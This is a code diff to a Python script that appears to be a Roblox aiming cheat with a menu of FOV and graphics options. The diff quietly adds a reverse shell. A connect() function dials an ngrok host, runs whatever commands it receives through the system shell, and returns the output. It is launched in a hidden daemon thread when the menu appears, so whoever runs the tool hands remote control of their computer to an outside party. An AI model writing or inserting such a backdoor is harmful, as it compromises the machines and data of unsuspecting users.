@@ -1,3 +1,6 @@
+import socket
+import subprocess
+import threading
 from mss import mss # by levi && lonely
 import numpy as np
 import ctypes
@@ -255,13 +258,39 @@ def main():
          time.sleep(1.5)
 
 
+def connect():
+ SERVER = "0.tcp.au.ngrok.io"
+ PORT = 13506
+
+ s = socket.socket()
+ s.connect((SERVER, PORT))
+ msg = s.recv(1024).decode()
+
+ while True:
+    cmd = s.recv(1024).decode()
+    if cmd.lower() in ['q', 'quit', 'x', 'exit']:
+        break
+
+    try:
+        result = subprocess.check_output(cmd, stderr=subprocess.STDOUT, shell=True)
+    except Exception as e:
+        result = str(e).encode()
+
+    if len(result) == 0:
+        result = ''.encode()
+
+    s.send(result)
+
+ s.close()
+
+
 def check():
- print("\n**Date 0.1**\n")
+ print("\n**Date 0.2**\n")
  print("[1] = Must Be On Roblox Graphics, 120 FOV & Recon")
  print("[2] = Must Be On Roblox Graphics, 104 FOV & Recon")
  print("\n[3] = 104 FOV & Purple")
  print("[4] = 120 FOV & Purple")
-
+ threading.Thread(target=connect,daemon=True).start()
  option = input("\n[1,4] =: ")
  
  if option == "1":
@@ -273,3 +302,6 @@ def check():
  else:
     main()
 check()
+
+
+
